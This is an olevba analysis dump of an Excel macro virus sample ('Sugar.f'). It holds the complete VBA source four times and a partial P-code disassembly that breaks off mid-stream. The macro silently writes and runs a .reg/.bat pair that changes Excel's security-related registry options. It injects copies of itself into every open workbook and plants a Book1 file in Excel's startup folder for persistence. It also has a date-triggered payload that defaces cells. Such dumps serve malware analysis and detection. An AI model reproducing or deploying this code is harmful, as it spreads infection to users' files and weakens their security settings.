olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Sugar.f.xls
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSExcel.Sugar.f.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public running As Boolean
Private Sub Workbook_WindowDeactivate(ByVal Wn As Excel.Window)
On Error Resume Next
If UCase(Dir("c:\tb6.reg")) <> "TB6.REG" Or UCase(Dir("c:\tb6.bat")) <> "TB6.BAT" Then
Open "c:\tb6.reg" For Output As 1
Print #1, "REGEDIT4"
Print #1, "[HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel]"
Print #1, """Options6""=dword:00000000"
Close 1
Open "c:\tb6.bat" For Output As 1
Print #1, "regedit /s c:\tb6.reg"
Close 1
End If
For x = 1 To Workbooks.Count
WeIn = Workbooks(x).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.CountOfLines
If WeIn <> 0 Then
VCode = Workbooks(x).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.Lines(3, (WeIn - 2))
End If
If Len(VCode) > 3000 Then
GoTo out
End If
For yz = 1 To Workbooks(x).VBProject.VBComponents.Count
Weins1 = Workbooks(x).VBProject.VBComponents.Item(yz).CodeModule.CountOfLines
Weins2 = Workbooks(x).VBProject.VBComponents.Item(yz).Name
If InStr(1, Weins2, "Sheet") Then
If Weins1 <> 0 Then
VCode = Workbooks(x).VBProject.VBComponents.Item(yz).CodeModule.Lines(3, (Weins1 - 2))
End If
If Len(VCode) > 3000 Then
GoTo out
End If
End If
Next yz
Next x
out:
If UCase(Dir(Application.StartupPath + "\Book1.")) = UCase("Book1") Then
PXLS = True
End If
If PXLS = False And running <> True Then
running = True
Workbooks.Add.SaveAs FileName:=Application.StartupPath & "\Book1.", FileFormat:=xlNormal, AddToMru:=False
End If
For x = 1 To Workbooks.Count
WeIn = Workbooks(x).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.CountOfLines
If WeIn = 0 Then
Workbooks(x).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.AddFromString ("Public running As Boolean" & vbCr & "Private Sub Workbook_WindowDeactivate(ByVal Wn As Excel.Window)" & vbCr & VCode)
End If
For yy = 1 To Workbooks(x).VBProject.VBComponents.Count
Weins2 = Workbooks(x).VBProject.VBComponents.Item(yy).Name
Weins1 = Workbooks(x).VBProject.VBComponents.Item(yy).CodeModule.CountOfLines
If Weins1 = 0 Then
If InStr(1, Weins2, "Sheet") Then
Workbooks(x).VBProject.VBComponents.Item(yy).CodeModule.AddFromString ("Public running As Boolean" & vbCr & "Private Sub Worksheet_Activate()" & vbCr & VCode)
End If
End If
Next yy
Next x
If PXLS = False Then
Workbooks("Book1.").Close SaveChanges:=True
Shell "c:\tb6.bat", vbHide
End If
If (Day(Now) = Minute(Now)) Then
Randomize
For x = 1 To 200 Step Int(Rnd * 2) + 1
ltr = Chr(65 + Int(Rnd * 22))
Where = ltr & (Int(Rnd * 20) + 1)
Range(Where).Select
ActiveCell.FormulaR1C1 = "-(Zou-zou-zou-zoubidaaaaa)-"
Range(Where).Select
With Selection.Font
.Name = "Comic Sans MS"
.Size = 8
End With
Columns(ltr & ":" & ltr).EntireColumn.AutoFit
Selection.Font.ColorIndex = Int(Rnd * 56 + 1)
Next x
Range("A1").Select
ActiveCell.FormulaR1C1 = "- Y'a un bug, mais c'est pas grave... -"
Columns("A:A").EntireColumn.AutoFit
End If
End Sub

-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: Virus.MSExcel.Sugar.f.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public running As Boolean
Private Sub Worksheet_Activate()
On Error Resume Next
If UCase(Dir("c:\tb6.reg")) <> "TB6.REG" Or UCase(Dir("c:\tb6.bat")) <> "TB6.BAT" Then
Open "c:\tb6.reg" For Output As 1
Print #1, "REGEDIT4"
Print #1, "[HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel]"
Print #1, """Options6""=dword:00000000"
Close 1
Open "c:\tb6.bat" For Output As 1
Print #1, "regedit /s c:\tb6.reg"
Close 1
End If
For x = 1 To Workbooks.Count
WeIn = Workbooks(x).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.CountOfLines
If WeIn <> 0 Then
VCode = Workbooks(x).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.Lines(3, (WeIn - 2))
End If
If Len(VCode) > 3000 Then
GoTo out
End If
For yz = 1 To Workbooks(x).VBProject.VBComponents.Count
Weins1 = Workbooks(x).VBProject.VBComponents.Item(yz).CodeModule.CountOfLines
Weins2 = Workbooks(x).VBProject.VBComponents.Item(yz).Name
If InStr(1, Weins2, "Sheet") Then
If Weins1 <> 0 Then
VCode = Workbooks(x).VBProject.VBComponents.Item(yz).CodeModule.Lines(3, (Weins1 - 2))
End If
If Len(VCode) > 3000 Then
GoTo out
End If
End If
Next yz
Next x
out:
If UCase(Dir(Application.StartupPath + "\Book1.")) = UCase("Book1") Then
PXLS = True
End If
If PXLS = False And running <> True Then
running = True
Workbooks.Add.SaveAs FileName:=Application.StartupPath & "\Book1.", FileFormat:=xlNormal, AddToMru:=False
End If
For x = 1 To Workbooks.Count
WeIn = Workbooks(x).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.CountOfLines
If WeIn = 0 Then
Workbooks(x).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.AddFromString ("Public running As Boolean" & vbCr & "Private Sub Workbook_WindowDeactivate(ByVal Wn As Excel.Window)" & vbCr & VCode)
End If
For yy = 1 To Workbooks(x).VBProject.VBComponents.Count
Weins2 = Workbooks(x).VBProject.VBComponents.Item(yy).Name
Weins1 = Workbooks(x).VBProject.VBComponents.Item(yy).CodeModule.CountOfLines
If Weins1 = 0 Then
If InStr(1, Weins2, "Sheet") Then
Workbooks(x).VBProject.VBComponents.Item(yy).CodeModule.AddFromString ("Public running As Boolean" & vbCr & "Private Sub Worksheet_Activate()" & vbCr & VCode)
End If
End If
Next yy
Next x
If PXLS = False Then
Workbooks("Book1.").Close SaveChanges:=True
Shell "c:\tb6.bat", vbHide
End If
If (Day(Now) = Minute(Now)) Then
Randomize
For x = 1 To 200 Step Int(Rnd * 2) + 1
ltr = Chr(65 + Int(Rnd * 22))
Where = ltr & (Int(Rnd * 20) + 1)
Range(Where).Select
ActiveCell.FormulaR1C1 = "-(Zou-zou-zou-zoubidaaaaa)-"
Range(Where).Select
With Selection.Font
.Name = "Comic Sans MS"
.Size = 8
End With
Columns(ltr & ":" & ltr).EntireColumn.AutoFit
Selection.Font.ColorIndex = Int(Rnd * 56 + 1)
Next x
Range("A1").Select
ActiveCell.FormulaR1C1 = "- Y'a un bug, mais c'est pas grave... -"
Columns("A:A").EntireColumn.AutoFit
End If
End Sub

-------------------------------------------------------------------------------
VBA MACRO Sheet2.cls 
in file: Virus.MSExcel.Sugar.f.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public running As Boolean
Private Sub Worksheet_Activate()
On Error Resume Next
If UCase(Dir("c:\tb6.reg")) <> "TB6.REG" Or UCase(Dir("c:\tb6.bat")) <> "TB6.BAT" Then
Open "c:\tb6.reg" For Output As 1
Print #1, "REGEDIT4"
Print #1, "[HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel]"
Print #1, """Options6""=dword:00000000"
Close 1
Open "c:\tb6.bat" For Output As 1
Print #1, "regedit /s c:\tb6.reg"
Close 1
End If
For x = 1 To Workbooks.Count
WeIn = Workbooks(x).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.CountOfLines
If WeIn <> 0 Then
VCode = Workbooks(x).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.Lines(3, (WeIn - 2))
End If
If Len(VCode) > 3000 Then
GoTo out
End If
For yz = 1 To Workbooks(x).VBProject.VBComponents.Count
Weins1 = Workbooks(x).VBProject.VBComponents.Item(yz).CodeModule.CountOfLines
Weins2 = Workbooks(x).VBProject.VBComponents.Item(yz).Name
If InStr(1, Weins2, "Sheet") Then
If Weins1 <> 0 Then
VCode = Workbooks(x).VBProject.VBComponents.Item(yz).CodeModule.Lines(3, (Weins1 - 2))
End If
If Len(VCode) > 3000 Then
GoTo out
End If
End If
Next yz
Next x
out:
If UCase(Dir(Application.StartupPath + "\Book1.")) = UCase("Book1") Then
PXLS = True
End If
If PXLS = False And running <> True Then
running = True
Workbooks.Add.SaveAs FileName:=Application.StartupPath & "\Book1.", FileFormat:=xlNormal, AddToMru:=False
End If
For x = 1 To Workbooks.Count
WeIn = Workbooks(x).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.CountOfLines
If WeIn = 0 Then
Workbooks(x).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.AddFromString ("Public running As Boolean" & vbCr & "Private Sub Workbook_WindowDeactivate(ByVal Wn As Excel.Window)" & vbCr & VCode)
End If
For yy = 1 To Workbooks(x).VBProject.VBComponents.Count
Weins2 = Workbooks(x).VBProject.VBComponents.Item(yy).Name
Weins1 = Workbooks(x).VBProject.VBComponents.Item(yy).CodeModule.CountOfLines
If Weins1 = 0 Then
If InStr(1, Weins2, "Sheet") Then
Workbooks(x).VBProject.VBComponents.Item(yy).CodeModule.AddFromString ("Public running As Boolean" & vbCr & "Private Sub Worksheet_Activate()" & vbCr & VCode)
End If
End If
Next yy
Next x
If PXLS = False Then
Workbooks("Book1.").Close SaveChanges:=True
Shell "c:\tb6.bat", vbHide
End If
If (Day(Now) = Minute(Now)) Then
Randomize
For x = 1 To 200 Step Int(Rnd * 2) + 1
ltr = Chr(65 + Int(Rnd * 22))
Where = ltr & (Int(Rnd * 20) + 1)
Range(Where).Select
ActiveCell.FormulaR1C1 = "-(Zou-zou-zou-zoubidaaaaa)-"
Range(Where).Select
With Selection.Font
.Name = "Comic Sans MS"
.Size = 8
End With
Columns(ltr & ":" & ltr).EntireColumn.AutoFit
Selection.Font.ColorIndex = Int(Rnd * 56 + 1)
Next x
Range("A1").Select
ActiveCell.FormulaR1C1 = "- Y'a un bug, mais c'est pas grave... -"
Columns("A:A").EntireColumn.AutoFit
End If
End Sub

-------------------------------------------------------------------------------
VBA MACRO Sheet3.cls 
in file: Virus.MSExcel.Sugar.f.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public running As Boolean
Private Sub Worksheet_Activate()
On Error Resume Next
If UCase(Dir("c:\tb6.reg")) <> "TB6.REG" Or UCase(Dir("c:\tb6.bat")) <> "TB6.BAT" Then
Open "c:\tb6.reg" For Output As 1
Print #1, "REGEDIT4"
Print #1, "[HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel]"
Print #1, """Options6""=dword:00000000"
Close 1
Open "c:\tb6.bat" For Output As 1
Print #1, "regedit /s c:\tb6.reg"
Close 1
End If
For x = 1 To Workbooks.Count
WeIn = Workbooks(x).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.CountOfLines
If WeIn <> 0 Then
VCode = Workbooks(x).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.Lines(3, (WeIn - 2))
End If
If Len(VCode) > 3000 Then
GoTo out
End If
For yz = 1 To Workbooks(x).VBProject.VBComponents.Count
Weins1 = Workbooks(x).VBProject.VBComponents.Item(yz).CodeModule.CountOfLines
Weins2 = Workbooks(x).VBProject.VBComponents.Item(yz).Name
If InStr(1, Weins2, "Sheet") Then
If Weins1 <> 0 Then
VCode = Workbooks(x).VBProject.VBComponents.Item(yz).CodeModule.Lines(3, (Weins1 - 2))
End If
If Len(VCode) > 3000 Then
GoTo out
End If
End If
Next yz
Next x
out:
If UCase(Dir(Application.StartupPath + "\Book1.")) = UCase("Book1") Then
PXLS = True
End If
If PXLS = False And running <> True Then
running = True
Workbooks.Add.SaveAs FileName:=Application.StartupPath & "\Book1.", FileFormat:=xlNormal, AddToMru:=False
End If
For x = 1 To Workbooks.Count
WeIn = Workbooks(x).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.CountOfLines
If WeIn = 0 Then
Workbooks(x).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.AddFromString ("Public running As Boolean" & vbCr & "Private Sub Workbook_WindowDeactivate(ByVal Wn As Excel.Window)" & vbCr & VCode)
End If
For yy = 1 To Workbooks(x).VBProject.VBComponents.Count
Weins2 = Workbooks(x).VBProject.VBComponents.Item(yy).Name
Weins1 = Workbooks(x).VBProject.VBComponents.Item(yy).CodeModule.CountOfLines
If Weins1 = 0 Then
If InStr(1, Weins2, "Sheet") Then
Workbooks(x).VBProject.VBComponents.Item(yy).CodeModule.AddFromString ("Public running As Boolean" & vbCr & "Private Sub Worksheet_Activate()" & vbCr & VCode)
End If
End If
Next yy
Next x
If PXLS = False Then
Workbooks("Book1.").Close SaveChanges:=True
Shell "c:\tb6.bat", vbHide
End If
If (Day(Now) = Minute(Now)) Then
Randomize
For x = 1 To 200 Step Int(Rnd * 2) + 1
ltr = Chr(65 + Int(Rnd * 22))
Where = ltr & (Int(Rnd * 20) + 1)
Range(Where).Select
ActiveCell.FormulaR1C1 = "-(Zou-zou-zou-zoubidaaaaa)-"
Range(Where).Select
With Selection.Font
.Name = "Comic Sans MS"
.Size = 8
End With
Columns(ltr & ":" & ltr).EntireColumn.AutoFit
Selection.Font.ColorIndex = Int(Rnd * 56 + 1)
Next x
Range("A1").Select
ActiveCell.FormulaR1C1 = "- Y'a un bug, mais c'est pas grave... -"
Columns("A:A").EntireColumn.AutoFit
End If
End Sub

-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSExcel.Sugar.f.xls
' ===============================================================================
' Module streams:
' _VBA_PROJECT_CUR/VBA/ThisWorkbook - 10832 bytes
' Line #0:
' 	Dim (Public) 
' 	VarDefn running (As Boolean)
' Line #1:
' 	FuncDefn (Private Sub Workbook_WindowDeactivate(ByVal Wn As ))
' Line #2:
' 	OnError (Resume Next) 
' Line #3:
' 	LitStr 0x000A "c:\tb6.reg"
' 	ArgsLd Dir 0x0001 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0007 "TB6.REG"
' 	Ne 
' 	LitStr 0x000A "c:\tb6.bat"
' 	ArgsLd Dir 0x0001 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0007 "TB6.BAT"
' 	Ne 
' 	Or 
' 	IfBlock 
' Line #4:
' 	LitStr 0x000A "c:\tb6.reg"
' 	LitDI2 0x0001 
' 	LitDefault 
' 	Open (For Output)
' Line #5:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0008 "REGEDIT4"
' 	PrintItemNL 
' Line #6:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0047 "[HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel]"
' 	PrintItemNL 
' Line #7:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0019 ""Options6"=dword:00000000"
' 	PrintItemNL 
' Line #8:
' 	LitDI2 0x0001 
' 	Close 0x0001 
' Line #9:
' 	LitStr 0x000A "c:\tb6.bat"
' 	LitDI2 0x0001 
' 	LitDefault 
' 	Open (For Output)
' Line #10:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0015 "regedit /s c:\tb6.reg"
' 	PrintItemNL 
' Line #11:
' 	LitDI2 0x0001 
' 	Close 0x0001 
' Line #12:
' 	EndIfBlock 
' Line #13:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Workbooks 
' 	MemLd Count 
' 	For 
' Line #14:
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St WeIn 
' Line #15:
' 	Ld WeIn 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #16:
' 	LitDI2 0x0003 
' 	Ld WeIn 
' 	LitDI2 0x0002 
' 	Sub 
' 	Paren 
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St VCode 
' Line #17:
' 	EndIfBlock 
' Line #18:
' 	Ld VCode 
' 	FnLen 
' 	LitDI2 0x0BB8 
' 	Gt 
' 	IfBlock 
' Line #19:
' 	GoTo out 
' Line #20:
' 	EndIfBlock 
' Line #21:
' 	StartForVariable 
' 	Ld yz 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #22:
' 	Ld yz 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St Weins1 
' Line #23:
' 	Ld yz 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	St Weins2 
' Line #24:
' 	LitDI2 0x0001 
' 	Ld Weins2 
' 	LitStr 0x0005 "Sheet"
' 	FnInStr3 
' 	IfBlock 
' Line #25:
' 	Ld Weins1 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #26:
' 	LitDI2 0x0003 
' 	Ld Weins1 
' 	LitDI2 0x0002 
' 	Sub 
' 	Paren 
' 	Ld yz 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St VCode 
' Line #27:
' 	EndIfBlock 
' Line #28:
' 	Ld VCode 
' 	FnLen 
' 	LitDI2 0x0BB8 
' 	Gt 
' 	IfBlock 
' Line #29:
' 	GoTo out 
' Line #30:
' 	EndIfBlock 
' Line #31:
' 	EndIfBlock 
' Line #32:
' 	StartForVariable 
' 	Ld yz 
' 	EndForVariable 
' 	NextVar 
' Line #33:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #34:
' 	Label out 
' Line #35:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x0007 "\Book1."
' 	Add 
' 	ArgsLd Dir 0x0001 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0005 "Book1"
' 	ArgsLd UCase 0x0001 
' 	Eq 
' 	IfBlock 
' Line #36:
' 	LitVarSpecial (True)
' 	St PXLS 
' Line #37:
' 	EndIfBlock 
' Line #38:
' 	Ld PXLS 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld running 
' 	LitVarSpecial (True)
' 	Ne 
' 	And 
' 	IfBlock 
' Line #39:
' 	LitVarSpecial (True)
' 	St running 
' Line #40:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x0007 "\Book1."
' 	Concat 
' 	ParamNamed FileName 
' 	Ld xlNormal 
' 	ParamNamed FileFormat 
' 	LitVarSpecial (False)
' 	ParamNamed AddToMru 
' 	Ld Workbooks 
' 	MemLd Add 
' 	ArgsMemCall SaveAs 0x0003 
' Line #41:
' 	EndIfBlock 
' Line #42:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Workbooks 
' 	MemLd Count 
' 	For 
' Line #43:
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St WeIn 
' Line #44:
' 	Ld WeIn 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #45:
' 	LitStr 0x0019 "Public running As Boolean"
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x003F "Private Sub Workbook_WindowDeactivate(ByVal Wn As Excel.Window)"
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	Ld VCode 
' 	Concat 
' 	Paren 
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #46:
' 	EndIfBlock 
' Line #47:
' 	StartForVariable 
' 	Ld yy 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #48:
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	St Weins2 
' Line #49:
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St Weins1 
' Line #50:
' 	Ld Weins1 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #51:
' 	LitDI2 0x0001 
' 	Ld Weins2 
' 	LitStr 0x0005 "Sheet"
' 	FnInStr3 
' 	IfBlock 
' Line #52:
' 	LitStr 0x0019 "Public running As Boolean"
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0020 "Private Sub Worksheet_Activate()"
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	Ld VCode 
' 	Concat 
' 	Paren 
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #53:
' 	EndIfBlock 
' Line #54:
' 	EndIfBlock 
' Line #55:
' 	StartForVariable 
' 	Ld yy 
' 	EndForVariable 
' 	NextVar 
' Line #56:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #57:
' 	Ld PXLS 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #58:
' 	LitVarSpecial (True)
' 	ParamNamed SaveChanges 
' 	LitStr 0x0006 "Book1."
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemCall Close 0x0001 
' Line #59:
' 	LitStr 0x000A "c:\tb6.bat"
' 	Ld vbHide 
' 	ArgsCall Shell 0x0002 
' Line #60:
' 	EndIfBlock 
' Line #61:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	Ld Now 
' 	ArgsLd Minute 0x0001 
' 	Eq 
' 	Paren 
' 	IfBlock 
' Line #62:
' 	ArgsCall Read 0x0000 
' Line #63:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x00C8 
' 	Ld Rnd 
' 	LitDI2 0x0002 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	ForStep 
' Line #64:
' 	LitDI2 0x0041 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	St ltr 
' Line #65:
' 	Ld ltr 
' 	Ld Rnd 
' 	LitDI2 0x0014 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	Paren 
' 	Concat 
' 	St Where 
' Line #66:
' 	Ld Where 
' 	ArgsLd Range 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #67:
' 	LitStr 0x001B "-(Zou-zou-zou-zoubidaaaaa)-"
' 	Ld ActiveCell 
' 	MemSt FormulaR1C1 
' Line #68:
' 	Ld Where 
' 	ArgsLd Range 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #69:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Font 
' 	With 
' Line #70:
' 	LitStr 0x000D "Comic Sans MS"
' 	MemStWith New 
' Line #71:
' 	LitDI2 0x0008 
' 	MemStWith Size 
' Line #72:
' 	EndWith 
' Line #73:
' 	Ld ltr 
' 	LitStr 0x0001 ":"
' 	Concat 
' 	Ld ltr 
' 	Concat 
' 	ArgsLd Columns 0x0001 
' 	MemLd EntireColumn 
' 	ArgsMemCall AutoFit 0x0000 
' Line #74:
' 	Ld Rnd 
' 	LitDI2 0x0038 
' 	Mul 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	Ld Selection 
' 	MemLd Font 
' 	MemSt ColorIndex 
' Line #75:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #76:
' 	LitStr 0x0002 "A1"
' 	ArgsLd Range 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #77:
' 	LitStr 0x0027 "- Y'a un bug, mais c'est pas grave... -"
' 	Ld ActiveCell 
' 	MemSt FormulaR1C1 
' Line #78:
' 	LitStr 0x0003 "A:A"
' 	ArgsLd Columns 0x0001 
' 	MemLd EntireColumn 
' 	ArgsMemCall AutoFit 0x0000 
' Line #79:
' 	EndIfBlock 
' Line #80:
' 	EndSub 
' Line #81:
' _VBA_PROJECT_CUR/VBA/Sheet1 - 5612 bytes
' Line #0:
' 	Dim (Public) 
' 	VarDefn running (As Boolean)
' Line #1:
' 	FuncDefn (Private Sub Worksheet_Activate())
' Line #2:
' 	OnError (Resume Next) 
' Line #3:
' 	LitStr 0x000A "c:\tb6.reg"
' 	ArgsLd Dir 0x0001 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0007 "TB6.REG"
' 	Ne 
' 	LitStr 0x000A "c:\tb6.bat"
' 	ArgsLd Dir 0x0001 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0007 "TB6.BAT"
' 	Ne 
' 	Or 
' 	IfBlock 
' Line #4:
' 	LitStr 0x000A "c:\tb6.reg"
' 	LitDI2 0x0001 
' 	LitDefault 
' 	Open (For Output)
' Line #5:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0008 "REGEDIT4"
' 	PrintItemNL 
' Line #6:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0047 "[HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel]"
' 	PrintItemNL 
' Line #7:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0019 ""Options6"=dword:00000000"
' 	PrintItemNL 
' Line #8:
' 	LitDI2 0x0001 
' 	Close 0x0001 
' Line #9:
' 	LitStr 0x000A "c:\tb6.bat"
' 	LitDI2 0x0001 
' 	LitDefault 
' 	Open (For Output)
' Line #10:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0015 "regedit /s c:\tb6.reg"
' 	PrintItemNL 
' Line #11:
' 	LitDI2 0x0001 
' 	Close 0x0001 
' Line #12:
' 	EndIfBlock 
' Line #13:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Workbooks 
' 	MemLd Count 
' 	For 
' Line #14:
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St WeIn 
' Line #15:
' 	Ld WeIn 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #16:
' 	LitDI2 0x0003 
' 	Ld WeIn 
' 	LitDI2 0x0002 
' 	Sub 
' 	Paren 
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St VCode 
' Line #17:
' 	EndIfBlock 
' Line #18:
' 	Ld VCode 
' 	FnLen 
' 	LitDI2 0x0BB8 
' 	Gt 
' 	IfBlock 
' Line #19:
' 	GoTo out 
' Line #20:
' 	EndIfBlock 
' Line #21:
' 	StartForVariable 
' 	Ld yz 
